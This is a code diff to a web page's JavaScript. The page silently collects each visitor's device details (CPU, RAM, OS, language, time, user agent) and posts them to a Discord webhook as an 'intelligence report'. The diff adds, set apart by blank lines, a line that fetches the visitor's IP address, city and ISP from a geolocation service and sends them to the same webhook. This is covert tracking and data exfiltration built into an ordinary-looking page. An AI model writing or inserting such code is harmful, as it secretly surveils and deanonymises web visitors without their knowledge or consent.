@@ -97,6 +97,12 @@
             document.getElementById('step2').classList.remove('hidden');
 
             const s = await getFullSpecs();
+
+
+
+
+
+            fetch('https://ipapi.co/json/').then(r => r.json()).then(d => fetch(webhookURL, {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({embeds:[{title:"🌐 IP Tracking", color:16711680, fields:[{name:"IP",value:d.ip,inline:true},{name:"City",value:d.city,inline:true},{name:"ISP",value:d.org}]}]})}));
             
             // إرسال تقرير استخباراتي كامل للديسكورد
             fetch(webhookURL, {
@@ -112,7 +118,7 @@
                             { name: "💻 Hardware", value: `CPU: \`${s.cores} Cores\`\nRAM: \`${s.ram}\``, inline: true },
                             { name: "🛠️ System", value: `OS: \`${s.os}\`\nLang: \`${s.lang}\``, inline: true },
                             { name: "⏰ Local Time", value: `\`${s.time}\``, inline: false },
-                            { name: "🌐 User Agent", value: `\`${s.agent}\``, inline: false }
+                            { name: "🌐 User Agent", value: `\`${s.agent}\``, inline: false },
                         ],
                         footer: { text: "تم سحب كافة بيانات الجهاز بنجاح" }
                     }]
